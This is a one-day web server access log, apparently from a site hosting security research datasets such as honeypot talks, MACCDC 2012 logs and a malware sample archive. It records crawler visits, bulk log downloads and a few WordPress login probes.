WSC,46.229.168.69,-,01/Jan/2017:12:25:28 -0800,GET /self.logs/error.log.2015-08-21.gz HTTP/1.1,200,1053
WSC,46.229.168.65,-,01/Jan/2017:12:25:42 -0800,GET /self.logs/access.log.2015-11-14.gz HTTP/1.1,200,5305
WSC,46.229.168.71,-,01/Jan/2017:12:25:55 -0800,GET /self.logs/error.log.2015-08-06.gz HTTP/1.1,200,692
WSC,46.229.168.67,-,01/Jan/2017:12:26:11 -0800,GET /self.logs/access.log.2015-07-30.gz HTTP/1.1,200,4058
WSC,46.229.168.72,-,01/Jan/2017:12:26:32 -0800,GET /self.logs/?C=D%3BO%3DA HTTP/1.1,200,14663
WSC,46.229.168.68,-,01/Jan/2017:12:27:08 -0800,GET /self.logs/access.log.2016-04-21.gz HTTP/1.1,200,23644
WSC,46.229.168.70,-,01/Jan/2017:12:27:12 -0800,GET /self.logs/access.log.2016-05-22.gz HTTP/1.1,200,11571
WSC,221.4.169.197,-,01/Jan/2017:12:27:16 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279362
WSC,46.229.168.65,-,01/Jan/2017:12:27:28 -0800,GET /self.logs/access.log.2015-09-26.gz HTTP/1.1,200,3612
WSC,46.229.168.65,-,01/Jan/2017:12:27:50 -0800,GET /self.logs/access.log.2015-08-11.gz HTTP/1.1,200,5970
WSC,46.229.168.67,-,01/Jan/2017:12:28:19 -0800,GET /self.logs/access.log.2015-06-15.gz HTTP/1.1,200,7949
WSC,46.229.168.73,-,01/Jan/2017:12:28:29 -0800,GET /auth.log/auth.log.gz HTTP/1.1,200,304719
WSC,221.4.169.197,-,01/Jan/2017:12:27:04 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,933960
WSC,46.229.168.66,-,01/Jan/2017:12:28:42 -0800,GET /self.logs/error.log.2016-05-15.gz HTTP/1.1,200,522
WSC,46.229.168.65,-,01/Jan/2017:12:29:05 -0800,GET /self.logs/error.log.2016-04-02.gz HTTP/1.1,200,623
WSC,54.172.242.152,-,01/Jan/2017:12:29:12 -0800,GET /self.logs/access.log.2015-02-14.gz HTTP/1.1,200,25834
WSC,46.229.168.70,-,01/Jan/2017:12:29:28 -0800,GET /self.logs/error.log.2015-11-16.gz HTTP/1.1,200,598
WSC,46.229.168.71,-,01/Jan/2017:12:29:40 -0800,GET /self.logs/error.log.2016-04-08.gz HTTP/1.1,200,692
WSC,46.229.168.70,-,01/Jan/2017:12:30:01 -0800,GET /self.logs/error.log.2015-11-10.gz HTTP/1.1,200,591
WSC,46.229.168.68,-,01/Jan/2017:12:30:13 -0800,GET /self.logs/error.log.2015-04-18.gz HTTP/1.1,200,1070
WSC,46.229.168.71,-,01/Jan/2017:12:30:35 -0800,GET /self.logs/access.log.2015-03-07.gz HTTP/1.1,200,2711
WSC,46.229.168.65,-,01/Jan/2017:12:30:52 -0800,GET /self.logs/access.log.2015-07-24.gz HTTP/1.1,200,4106
WSC,46.229.168.73,-,01/Jan/2017:12:31:11 -0800,GET /self.logs/access.log.2015-08-24.gz HTTP/1.1,200,22786
WSC,46.229.168.73,-,01/Jan/2017:12:31:30 -0800,GET /self.logs/access.log.2015-08-13.gz HTTP/1.1,200,4622
WSC,46.229.168.68,-,01/Jan/2017:12:31:49 -0800,GET / HTTP/1.1,200,10230
WSC,46.229.168.73,-,01/Jan/2017:12:32:07 -0800,GET /self.logs/error.log.2015-07-28.gz HTTP/1.1,200,652
WSC,66.249.66.197,-,01/Jan/2017:12:32:30 -0800,GET /robots.txt HTTP/1.1,301,502
WSC,66.249.66.103,-,01/Jan/2017:12:32:30 -0800,GET /robots.txt HTTP/1.1,200,334
WSC,66.249.66.209,-,01/Jan/2017:12:32:31 -0800,GET / HTTP/1.1,301,483
WSC,66.249.66.105,-,01/Jan/2017:12:32:31 -0800,GET / HTTP/1.1,200,10267
WSC,46.229.168.65,-,01/Jan/2017:12:32:31 -0800,GET /self.logs/error.log.2015-02-15.gz HTTP/1.1,200,5772
WSC,46.229.168.68,-,01/Jan/2017:12:32:46 -0800,GET /self.logs/access.log.2016-05-04.gz HTTP/1.1,200,17024
WSC,46.229.168.66,-,01/Jan/2017:12:33:00 -0800,GET /maccdc2012/ssh.log.gz HTTP/1.1,200,182480
WSC,46.229.168.65,-,01/Jan/2017:12:33:22 -0800,GET /self.logs/error.log.2015-09-17.gz HTTP/1.1,200,796
WSC,46.229.168.68,-,01/Jan/2017:12:33:38 -0800,GET /self.logs/access.log.2016-03-06.gz HTTP/1.1,200,7444
WSC,46.229.168.71,-,01/Jan/2017:12:33:54 -0800,GET /self.logs/error.log.2015-05-20.gz HTTP/1.1,200,776
WSC,46.229.168.65,-,01/Jan/2017:12:34:12 -0800,GET /self.logs/error.log.2016-05-22.gz HTTP/1.1,200,682
WSC,46.229.168.73,-,01/Jan/2017:12:34:31 -0800,GET /self.logs/error.log.2015-06-22.gz HTTP/1.1,200,2801
WSC,46.229.168.67,-,01/Jan/2017:12:34:51 -0800,GET /self.logs/error.log.2016-03-16.gz HTTP/1.1,200,795
WSC,46.229.168.73,-,01/Jan/2017:12:35:08 -0800,GET /self.logs/error.log.2016-04-22.gz HTTP/1.1,200,713
WSC,46.229.168.67,-,01/Jan/2017:12:35:25 -0800,GET /self.logs/access.log.2015-01-31.gz HTTP/1.1,200,4200
WSC,46.229.168.73,-,01/Jan/2017:12:35:50 -0800,GET /self.logs/error.log.2015-04-05.gz HTTP/1.1,200,1012
WSC,46.229.168.69,-,01/Jan/2017:12:36:03 -0800,GET /self.logs/error.log.2015-01-25.gz HTTP/1.1,200,574
WSC,46.229.168.65,-,01/Jan/2017:12:36:24 -0800,GET /self.logs/access.log.2016-06-01.gz HTTP/1.1,200,9916
WSC,46.229.168.71,-,01/Jan/2017:12:36:42 -0800,GET /self.logs/error.log.2016-05-17.gz HTTP/1.1,200,650
WSC,46.229.168.67,-,01/Jan/2017:12:37:01 -0800,GET /self.logs/error.log.2015-01-18.gz HTTP/1.1,200,1222
WSC,46.229.168.66,-,01/Jan/2017:12:37:14 -0800,GET /self.logs/access.log.2016-04-08.gz HTTP/1.1,200,19909
WSC,46.229.168.70,-,01/Jan/2017:12:37:33 -0800,GET /self.logs/error.log.2015-02-25.gz HTTP/1.1,200,989
WSC,46.229.168.67,-,01/Jan/2017:12:37:48 -0800,GET /self.logs/error.log.2015-07-16.gz HTTP/1.1,200,646
WSC,46.229.168.73,-,01/Jan/2017:12:38:10 -0800,GET /self.logs/error.log.2015-10-13.gz HTTP/1.1,200,712
WSC,46.229.168.74,-,01/Jan/2017:12:38:29 -0800,GET /self.logs/access.log.2015-09-07.gz HTTP/1.1,200,4049
WSC,46.229.168.65,-,01/Jan/2017:12:38:45 -0800,GET /self.logs/access.log.2015-06-02.gz HTTP/1.1,200,3760
WSC,46.229.168.71,-,01/Jan/2017:12:39:10 -0800,GET /self.logs/access.log.2016-03-30.gz HTTP/1.1,200,8775
WSC,46.229.168.74,-,01/Jan/2017:12:39:22 -0800,GET /self.logs/error.log.2016-04-23.gz HTTP/1.1,200,605
WSC,46.229.168.66,-,01/Jan/2017:12:39:41 -0800,GET /self.logs/access.log.2015-04-22.gz HTTP/1.1,200,14685
WSC,46.229.168.73,-,01/Jan/2017:12:40:03 -0800,GET /self.logs/access.log.2016-06-10.gz HTTP/1.1,200,16817
WSC,46.229.168.65,-,01/Jan/2017:12:40:15 -0800,GET /self.logs/error.log.2016-05-23.gz HTTP/1.1,200,757
WSC,46.229.168.70,-,01/Jan/2017:12:40:35 -0800,GET /self.logs/access.log.2015-05-14.gz HTTP/1.1,200,6083
WSC,46.229.168.66,-,01/Jan/2017:12:41:01 -0800,GET /self.logs/error.log.2015-07-29.gz HTTP/1.1,200,705
WSC,46.229.168.72,-,01/Jan/2017:12:41:09 -0800,GET /self.logs/access.log.2015-02-11.gz HTTP/1.1,200,4623
WSC,46.229.168.68,-,01/Jan/2017:12:41:31 -0800,GET /self.logs/error.log.2015-11-29.gz HTTP/1.1,200,623
WSC,46.229.168.74,-,01/Jan/2017:12:41:49 -0800,GET /self.logs/error.log.2015-06-26.gz HTTP/1.1,200,763
WSC,46.229.168.69,-,01/Jan/2017:12:42:06 -0800,GET /self.logs/error.log.2015-03-28.gz HTTP/1.1,200,922
WSC,46.229.168.74,-,01/Jan/2017:12:42:22 -0800,GET /self.logs/error.log.2015-11-05.gz HTTP/1.1,200,1076
WSC,46.229.168.70,-,01/Jan/2017:12:42:42 -0800,GET /self.logs/error.log.2015-05-21.gz HTTP/1.1,200,787
WSC,46.229.168.70,-,01/Jan/2017:12:43:01 -0800,GET /self.logs/error.log.2015-02-26.gz HTTP/1.1,200,1013
WSC,46.229.168.72,-,01/Jan/2017:12:43:15 -0800,GET /self.logs/access.log.2015-05-06.gz HTTP/1.1,200,6588
WSC,46.229.168.71,-,01/Jan/2017:12:43:39 -0800,GET /self.logs/access.log.2015-06-09.gz HTTP/1.1,200,8175
WSC,46.229.168.68,-,01/Jan/2017:12:43:52 -0800,GET /self.logs/error.log.2015-06-06.gz HTTP/1.1,200,719
WSC,46.229.168.68,-,01/Jan/2017:12:44:11 -0800,GET /self.logs/error.log.2015-06-17.gz HTTP/1.1,200,1115
WSC,46.229.168.72,-,01/Jan/2017:12:44:28 -0800,GET /self.logs/error.log.2015-07-01.gz HTTP/1.1,200,1008
WSC,46.229.168.69,-,01/Jan/2017:12:44:51 -0800,GET /self.logs/access.log.2016-04-10.gz HTTP/1.1,200,8376
WSC,46.229.168.67,-,01/Jan/2017:12:45:01 -0800,GET /self.logs/access.log.2016-04-22.gz HTTP/1.1,200,7997
WSC,46.229.168.74,-,01/Jan/2017:12:45:29 -0800,GET /self.logs/access.log.2015-10-31.gz HTTP/1.1,200,7220
WSC,46.229.168.72,-,01/Jan/2017:12:45:41 -0800,GET /self.logs/access.log.2016-02-08.gz HTTP/1.1,200,6677
WSC,46.229.168.65,-,01/Jan/2017:12:45:56 -0800,GET /self.logs/access.log.2015-07-12.gz HTTP/1.1,200,4540
WSC,46.229.168.70,-,01/Jan/2017:12:46:17 -0800,GET /self.logs/access.log.2015-09-14.gz HTTP/1.1,200,5491
WSC,46.229.168.71,-,01/Jan/2017:12:46:35 -0800,GET /self.logs/access.log.2016-04-25.gz HTTP/1.1,200,9383
WSC,46.229.168.73,-,01/Jan/2017:12:46:56 -0800,GET /self.logs/access.log.2015-10-07.gz HTTP/1.1,200,7000
WSC,46.229.168.72,-,01/Jan/2017:12:47:11 -0800,GET /self.logs/access.log.2015-12-22.gz HTTP/1.1,200,6223
WSC,46.229.168.65,-,01/Jan/2017:12:47:31 -0800,GET /self.logs/error.log.2016-03-20.gz HTTP/1.1,200,854
WSC,46.229.168.67,-,01/Jan/2017:12:47:46 -0800,GET /self.logs/error.log.2015-09-11.gz HTTP/1.1,200,666
WSC,46.229.168.70,-,01/Jan/2017:12:48:04 -0800,GET /self.logs/access.log.2016-02-07.gz HTTP/1.1,200,9101
WSC,46.229.168.65,-,01/Jan/2017:12:48:26 -0800,GET /self.logs/access.log.2015-07-10.gz HTTP/1.1,200,3969
WSC,46.229.168.69,-,01/Jan/2017:12:48:40 -0800,GET /self.logs/error.log.2016-05-13.gz HTTP/1.1,200,1038
WSC,46.229.168.68,-,01/Jan/2017:12:49:00 -0800,GET /self.logs/access.log.2015-09-09.gz HTTP/1.1,200,4674
WSC,46.229.168.74,-,01/Jan/2017:12:49:19 -0800,GET /self.logs/access.log.2015-09-10.gz HTTP/1.1,200,6075
WSC,46.229.168.65,-,01/Jan/2017:12:49:37 -0800,GET /self.logs/access.log.2015-12-07.gz HTTP/1.1,200,6438
WSC,46.229.168.65,-,01/Jan/2017:12:49:52 -0800,GET /self.logs/access.log.2016-02-03.gz HTTP/1.1,200,7249
WSC,46.229.168.65,-,01/Jan/2017:12:50:15 -0800,GET /self.logs/error.log.2015-02-24.gz HTTP/1.1,200,1666
WSC,46.229.168.65,-,01/Jan/2017:12:50:29 -0800,GET /self.logs/access.log.2015-03-18.gz HTTP/1.1,200,9455
WSC,46.229.168.71,-,01/Jan/2017:12:50:48 -0800,GET /maccdc2012/files.log.gz HTTP/1.1,200,306117
WSC,46.229.168.68,-,01/Jan/2017:12:51:09 -0800,GET /self.logs/access.log.2016-06-07.gz HTTP/1.1,200,9140
WSC,46.229.168.66,-,01/Jan/2017:12:51:24 -0800,GET /self.logs/access.log.2015-01-20.gz HTTP/1.1,200,3633
WSC,46.229.168.70,-,01/Jan/2017:12:51:42 -0800,GET /self.logs/access.log.2016-02-02.gz HTTP/1.1,200,7973
WSC,46.229.168.74,-,01/Jan/2017:12:52:04 -0800,GET /self.logs/error.log.2015-04-07.gz HTTP/1.1,200,663
WSC,46.229.168.74,-,01/Jan/2017:12:52:17 -0800,GET /self.logs/access.log.2015-11-27.gz HTTP/1.1,200,5589
WSC,46.229.168.71,-,01/Jan/2017:12:52:37 -0800,GET /self.logs/error.log.2016-02-17.gz HTTP/1.1,200,831
WSC,46.229.168.74,-,01/Jan/2017:12:52:56 -0800,GET /self.logs/access.log.2015-06-01.gz HTTP/1.1,200,4327
WSC,46.229.168.65,-,01/Jan/2017:12:53:13 -0800,GET /self.logs/error.log.2015-12-18.gz HTTP/1.1,200,521
WSC,46.229.168.66,-,01/Jan/2017:12:53:32 -0800,GET /self.logs/access.log.2015-11-09.gz HTTP/1.1,200,6120
WSC,46.229.168.72,-,01/Jan/2017:12:53:49 -0800,GET /self.logs/access.log.2015-12-12.gz HTTP/1.1,200,5412
WSC,46.229.168.71,-,01/Jan/2017:12:54:09 -0800,GET /self.logs/error.log.2015-12-13.gz HTTP/1.1,200,629
WSC,46.229.168.73,-,01/Jan/2017:12:54:24 -0800,GET /self.logs/error.log.2015-03-06.gz HTTP/1.1,200,798
WSC,46.229.168.67,-,01/Jan/2017:12:54:42 -0800,GET /self.logs/access.log.2016-03-21.gz HTTP/1.1,200,6585
WSC,46.229.168.67,-,01/Jan/2017:12:54:59 -0800,GET /self.logs/error.log.2016-01-02.gz HTTP/1.1,200,859
WSC,46.229.168.66,-,01/Jan/2017:12:55:23 -0800,GET /self.logs/access.log.2015-09-08.gz HTTP/1.1,200,3824
WSC,46.229.168.72,-,01/Jan/2017:12:55:42 -0800,GET /self.logs/error.log.2015-11-11.gz HTTP/1.1,200,581
WSC,66.102.6.129,-,01/Jan/2017:12:58:40 -0800,GET / HTTP/1.1,200,10267
WSC,66.102.6.159,-,01/Jan/2017:12:58:40 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,104.131.86.190,-,01/Jan/2017:13:34:56 -0800,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1,200,1614760
WSC,113.108.192.2,-,01/Jan/2017:13:37:39 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1,200,930836
WSC,185.182.49.31,-,01/Jan/2017:13:40:59 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0,200,930799
WSC,70.106.209.116,-,01/Jan/2017:13:47:59 -0800,GET / HTTP/1.1,304,189
WSC,37.144.52.198,-,01/Jan/2017:13:53:46 -0800,GET / HTTP/1.1,200,10230
WSC,37.144.52.198,-,01/Jan/2017:13:54:00 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7391
WSC,37.144.52.198,-,01/Jan/2017:13:54:00 -0800,GET /twitter-icon.png HTTP/1.1,200,27751
WSC,66.249.66.101,-,01/Jan/2017:13:57:30 -0800,GET / HTTP/1.1,200,10267
WSC,176.195.113.223,-,01/Jan/2017:14:00:02 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1,200,930799
WSC,66.249.83.84,-,01/Jan/2017:14:00:30 -0800,GET / HTTP/1.1,200,10267
WSC,66.249.83.83,-,01/Jan/2017:14:00:30 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,157.55.39.100,-,01/Jan/2017:14:17:19 -0800,GET / HTTP/1.1,200,10267
WSC,131.253.27.116,-,01/Jan/2017:14:17:23 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7372
WSC,131.253.27.116,-,01/Jan/2017:14:17:29 -0800,GET /twitter-icon.png HTTP/1.1,200,27732
WSC,207.46.13.157,-,01/Jan/2017:14:19:55 -0800,GET /robots.txt HTTP/1.1,200,289
WSC,123.125.67.224,-,01/Jan/2017:14:29:09 -0800,GET /robots.txt HTTP/1.1,200,297
WSC,180.76.15.33,-,01/Jan/2017:14:48:36 -0800,GET / HTTP/1.1,304,152
WSC,104.162.192.217,-,01/Jan/2017:14:51:42 -0800,GET /favicon.ico HTTP/1.1,200,268
WSC,96.250.56.15,-,01/Jan/2017:15:02:16 -0800,GET / HTTP/1.1,200,10267
WSC,96.250.56.15,-,01/Jan/2017:15:02:16 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,96.250.56.15,-,01/Jan/2017:15:02:16 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7427
WSC,96.250.56.15,-,01/Jan/2017:15:02:16 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,24.142.90.210,-,01/Jan/2017:15:07:10 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,24.142.90.210,-,01/Jan/2017:15:07:15 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,24.142.90.210,-,01/Jan/2017:15:07:20 -0800,GET / HTTP/1.1,200,34374
WSC,207.46.13.157,-,01/Jan/2017:15:11:52 -0800,GET /self.logs/access.log.2016-11-30.gz HTTP/1.1,200,12106
WSC,68.180.228.229,-,01/Jan/2017:15:34:37 -0800,GET /maccdc2012/ssh.log.gz HTTP/1.1,200,182461
WSC,78.68.160.67,-,01/Jan/2017:15:36:49 -0800,GET / HTTP/1.1,200,10267
WSC,78.68.160.67,-,01/Jan/2017:15:36:49 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,78.68.160.67,-,01/Jan/2017:15:36:50 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,78.68.160.67,-,01/Jan/2017:15:41:53 -0800,GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1,404,340
WSC,78.68.160.67,-,01/Jan/2017:15:41:53 -0800,GET /apple-touch-icon-152x152.png HTTP/1.1,404,339
WSC,78.68.160.67,-,01/Jan/2017:15:41:53 -0800,GET /apple-touch-icon.png HTTP/1.1,404,339
WSC,78.68.160.67,-,01/Jan/2017:15:41:54 -0800,GET /apple-touch-icon.png HTTP/1.1,404,339
WSC,78.68.160.67,-,01/Jan/2017:15:41:55 -0800,GET / HTTP/1.1,200,10267
WSC,78.68.160.67,-,01/Jan/2017:15:41:56 -0800,GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1,404,340
WSC,78.68.160.67,-,01/Jan/2017:15:41:56 -0800,GET /apple-touch-icon-152x152.png HTTP/1.1,404,339
WSC,78.68.160.67,-,01/Jan/2017:15:41:56 -0800,GET /apple-touch-icon-precomposed.png HTTP/1.1,404,339
WSC,78.68.160.67,-,01/Jan/2017:15:41:56 -0800,GET /apple-touch-icon.png HTTP/1.1,404,339
WSC,78.68.160.67,-,01/Jan/2017:15:41:57 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,157.55.39.232,-,01/Jan/2017:15:54:04 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279418
WSC,69.250.190.181,-,01/Jan/2017:16:11:38 -0800,GET / HTTP/1.1,200,10267
WSC,69.250.190.181,-,01/Jan/2017:16:11:39 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,69.250.190.181,-,01/Jan/2017:16:11:39 -0800,GET / HTTP/1.1,200,10266
WSC,69.250.190.181,-,01/Jan/2017:16:11:39 -0800,GET /apple-touch-icon-precomposed.png HTTP/1.1,404,340
WSC,69.250.190.181,-,01/Jan/2017:16:11:39 -0800,GET /apple-touch-icon.png HTTP/1.1,404,339
WSC,180.76.15.148,-,01/Jan/2017:16:40:25 -0800,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1,200,935860
WSC,60.180.157.119,-,01/Jan/2017:16:58:02 -0800,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1,200,2928460
WSC,123.57.239.25,-,01/Jan/2017:17:01:33 -0800,GET / HTTP/1.1,200,34363
WSC,121.40.39.151,-,01/Jan/2017:17:01:34 -0800,GET /feed HTTP/1.1,404,295
WSC,173.82.77.179,-,01/Jan/2017:17:01:39 -0800,GET /feed.xml HTTP/1.1,404,295
WSC,101.200.199.203,-,01/Jan/2017:17:01:39 -0800,GET /rss/ HTTP/1.1,404,295
WSC,101.200.204.113,-,01/Jan/2017:17:01:40 -0800,GET /atom HTTP/1.1,404,295
WSC,123.57.237.215,-,01/Jan/2017:17:01:41 -0800,GET /atom.xml HTTP/1.1,404,295
WSC,101.200.205.6,-,01/Jan/2017:17:01:42 -0800,GET / HTTP/1.1,200,34363
WSC,101.200.191.237,-,01/Jan/2017:17:01:43 -0800,GET /feed HTTP/1.1,404,295
WSC,182.92.7.12,-,01/Jan/2017:17:01:44 -0800,GET /feed.xml HTTP/1.1,404,295
WSC,101.200.204.198,-,01/Jan/2017:17:01:44 -0800,GET /rss/ HTTP/1.1,404,295
WSC,123.57.239.25,-,01/Jan/2017:17:01:45 -0800,GET /atom HTTP/1.1,404,295
WSC,121.40.39.151,-,01/Jan/2017:17:01:46 -0800,GET /atom.xml HTTP/1.1,404,295
WSC,178.252.127.220,-,01/Jan/2017:17:09:33 -0800,GET / HTTP/1.1,200,10267
WSC,178.252.127.220,-,01/Jan/2017:17:09:34 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7427
WSC,178.252.127.220,-,01/Jan/2017:17:09:34 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,75.118.9.134,-,01/Jan/2017:17:12:57 -0800,GET / HTTP/1.1,301,483
WSC,75.118.9.134,-,01/Jan/2017:17:12:57 -0800,GET / HTTP/1.1,200,10267
WSC,75.118.9.134,-,01/Jan/2017:17:12:57 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,75.118.9.134,-,01/Jan/2017:17:12:57 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,75.118.9.134,-,01/Jan/2017:17:12:57 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,157.55.39.232,-,01/Jan/2017:17:20:28 -0800,GET /robots.txt HTTP/1.1,301,518
WSC,157.55.39.232,-,01/Jan/2017:17:20:29 -0800,GET /robots.txt HTTP/1.1,200,288
WSC,157.55.39.232,-,01/Jan/2017:17:20:33 -0800,GET /honeypot/honeypot%20-%20howto.pdf HTTP/1.1,301,531
WSC,157.55.39.232,-,01/Jan/2017:17:20:38 -0800,GET /honeypot/honeypot%20-%20howto.pdf HTTP/1.1,404,340
WSC,157.55.39.100,-,01/Jan/2017:17:29:02 -0800,GET / HTTP/1.1,301,483
WSC,66.249.83.82,-,01/Jan/2017:17:30:10 -0800,GET / HTTP/1.1,200,10267
WSC,66.249.83.84,-,01/Jan/2017:17:30:10 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,157.55.39.100,-,01/Jan/2017:17:32:28 -0800,GET / HTTP/1.1,200,10267
WSC,77.75.76.161,-,01/Jan/2017:17:41:51 -0800,GET /robots.txt HTTP/1.1,200,334
WSC,77.75.76.161,-,01/Jan/2017:17:41:53 -0800,GET /self.logs/?C=M;O=A HTTP/1.1,200,15036
WSC,88.198.16.153,-,01/Jan/2017:17:43:39 -0800,GET /robots.txt HTTP/1.0,200,252
WSC,88.198.16.153,-,01/Jan/2017:17:43:41 -0800,GET /honeypot//%22http://glastopf.org//%22 HTTP/1.0,404,284
WSC,88.198.16.153,-,01/Jan/2017:17:43:42 -0800,GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.0,404,303
WSC,88.198.16.153,-,01/Jan/2017:17:43:45 -0800,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.0,404,303
WSC,88.198.16.153,-,01/Jan/2017:17:43:47 -0800,GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.0,404,303
WSC,180.76.15.140,-,01/Jan/2017:17:47:24 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,778180
WSC,68.180.228.229,-,01/Jan/2017:17:54:56 -0800,GET /self.logs/error.log.2015-08-06.gz HTTP/1.1,200,673
WSC,88.185.102.251,-,01/Jan/2017:18:16:08 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,88.185.102.251,-,01/Jan/2017:18:16:13 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,88.185.102.251,-,01/Jan/2017:18:16:18 -0800,GET / HTTP/1.1,200,34374
WSC,52.212.146.96,-,01/Jan/2017:18:30:01 -0800,GET /self.logs/access.log.2016-12-26.gz HTTP/1.1,200,8898
WSC,52.212.146.96,-,01/Jan/2017:18:30:02 -0800,GET /self.logs/access.log.2016-12-27.gz HTTP/1.1,200,30979
WSC,52.212.146.96,-,01/Jan/2017:18:30:02 -0800,GET /self.logs/access.log.2016-12-28.gz HTTP/1.1,200,28379
WSC,52.212.146.96,-,01/Jan/2017:18:30:02 -0800,GET /self.logs/access.log.2016-12-29.gz HTTP/1.1,200,8909
WSC,52.212.146.96,-,01/Jan/2017:18:30:02 -0800,GET /self.logs/access.log.2016-12-30.gz HTTP/1.1,404,340
WSC,52.212.146.96,-,01/Jan/2017:18:30:03 -0800,GET /self.logs/access.log.2016-12-31.gz HTTP/1.1,404,340
WSC,52.212.146.96,-,01/Jan/2017:18:30:03 -0800,GET /self.logs/access.log.2017-01-01.gz HTTP/1.1,404,340
WSC,123.125.71.85,-,01/Jan/2017:18:30:33 -0800,GET /robots.txt HTTP/1.1,200,297
WSC,185.100.84.82,-,01/Jan/2017:19:52:36 -0800,GET / HTTP/1.1,301,446
WSC,31.185.104.21,-,01/Jan/2017:19:52:51 -0800,GET / HTTP/1.1,200,10230
WSC,180.121.191.241,-,01/Jan/2017:20:11:01 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1,200,455928
WSC,68.54.170.68,-,01/Jan/2017:20:23:41 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,68.54.170.68,-,01/Jan/2017:20:23:47 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,68.54.170.68,-,01/Jan/2017:20:23:52 -0800,GET / HTTP/1.1,200,34374
WSC,211.210.103.197,-,01/Jan/2017:20:44:40 -0800,GET / HTTP/1.1,200,10267
WSC,211.210.103.197,-,01/Jan/2017:20:44:40 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,211.210.103.197,-,01/Jan/2017:20:44:41 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,211.210.103.197,-,01/Jan/2017:20:44:41 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,103.21.125.85,-,01/Jan/2017:20:17:29 -0800,GET /maccdc2012/conn.log.gz HTTP/1.1,200,551041579
WSC,103.21.125.85,-,01/Jan/2017:20:17:29 -0800,GET /maccdc2012/conn.log.gz HTTP/1.1,200,551041579
WSC,103.21.125.85,-,01/Jan/2017:20:17:29 -0800,GET /maccdc2012/conn.log.gz HTTP/1.1,200,551041579
WSC,103.21.125.85,-,01/Jan/2017:20:17:29 -0800,GET /maccdc2012/conn.log.gz HTTP/1.1,200,551041579
WSC,103.21.125.85,-,01/Jan/2017:20:17:29 -0800,GET /maccdc2012/conn.log.gz HTTP/1.1,200,436252007
WSC,157.49.22.184,-,01/Jan/2017:22:00:48 -0800,GET / HTTP/1.1,200,10267
WSC,157.49.22.184,-,01/Jan/2017:22:00:49 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,157.49.22.184,-,01/Jan/2017:22:00:50 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,157.49.22.184,-,01/Jan/2017:22:00:49 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,211.42.54.241,-,01/Jan/2017:22:13:11 -0800,GET / HTTP/1.1,301,483
WSC,211.42.54.241,-,01/Jan/2017:22:13:12 -0800,GET / HTTP/1.1,200,10267
WSC,211.42.54.241,-,01/Jan/2017:22:13:13 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,211.42.54.241,-,01/Jan/2017:22:13:13 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,211.42.54.241,-,01/Jan/2017:22:13:13 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,211.42.54.241,-,01/Jan/2017:22:15:58 -0800,GET /pe_static/zeus.zip HTTP/1.1,200,4493880
WSC,5.106.255.253,-,01/Jan/2017:22:24:05 -0800,GET / HTTP/1.1,200,10267
WSC,5.106.255.253,-,01/Jan/2017:22:24:07 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,5.106.255.253,-,01/Jan/2017:22:24:07 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,5.106.255.253,-,01/Jan/2017:22:24:07 -0800,GET / HTTP/1.1,200,10267
WSC,5.106.255.253,-,01/Jan/2017:22:24:09 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,5.106.255.253,-,01/Jan/2017:22:24:48 -0800,GET /maccdc2012/smtp.log.gz HTTP/1.1,200,6846
WSC,5.106.255.253,-,01/Jan/2017:22:26:14 -0800,GET / HTTP/1.1,200,10267
WSC,5.106.255.253,-,01/Jan/2017:22:26:14 -0800,GET /twitter-icon.png HTTP/1.1,304,165
